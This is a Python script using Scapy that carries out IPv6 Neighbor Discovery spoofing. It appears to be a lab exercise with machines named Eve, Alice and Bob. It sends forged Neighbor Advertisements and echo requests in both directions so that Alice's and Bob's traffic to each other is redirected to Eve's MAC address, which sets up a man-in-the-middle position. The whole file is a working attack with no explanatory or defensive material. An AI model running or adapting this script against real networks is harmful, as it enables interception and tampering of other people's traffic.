from scapy.all import *

# Eve details
EVE_IPv6 = "fe80::82b5:2e0c:405:fead"
EVE_MAC = "08:00:27:18:b4:02"

# Alice details
ALICE_IPv6 = "fe80::43cc:ca2f:ae1f:dbed"
ALICE_MAC = "08:00:27:53:f5:cb"

# Bob details
BOB_IPv6 = "fe80::1eaa:7821:6306:2979"
BOB_MAC = "08:00:27:ab:33:74"


def build_fake_na(victim_mac, victim_ip, target_ip):
    fake_na = Ether(src=EVE_MAC, dst=victim_mac)
    fake_na /= IPv6(src=target_ip, dst=victim_ip)
    fake_na /= ICMPv6ND_NA(R=0,S=1,O=1,tgt=target_ip)
    fake_na /= ICMPv6NDOptDstLLAddr(lladdr=EVE_MAC)
    return fake_na


def send_fake_na(victim_mac, victim_ip, target_ip):
    fake_na = build_fake_na(victim_mac, victim_ip, target_ip)
    fake_na.show()
    sendp(fake_na)


def build_fake_ping6(victim_mac, victim_ip, target_ip):
    fake_ping6 = Ether(src=EVE_MAC, dst=victim_mac)
    fake_ping6 /= IPv6(src=target_ip, dst=victim_ip)
    fake_ping6 /= ICMPv6EchoRequest(id=1,seq=1,data='hey')
    return fake_ping6


def send_fake_ping6(victim_mac, victim_ip, target_ip):
    fake_ping6 = build_fake_ping6(victim_mac, victim_ip, target_ip)
    fake_ping6.show()
    sendp(fake_ping6)


# ping6&na to alice "from bob"
send_fake_ping6(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
send_fake_na(ALICE_MAC, ALICE_IPv6, BOB_IPv6)

# ping&na to bob "from alice"
send_fake_ping6(BOB_MAC, BOB_IPv6, ALICE_IPv6)
send_fake_na(BOB_MAC, BOB_IPv6, ALICE_IPv6)
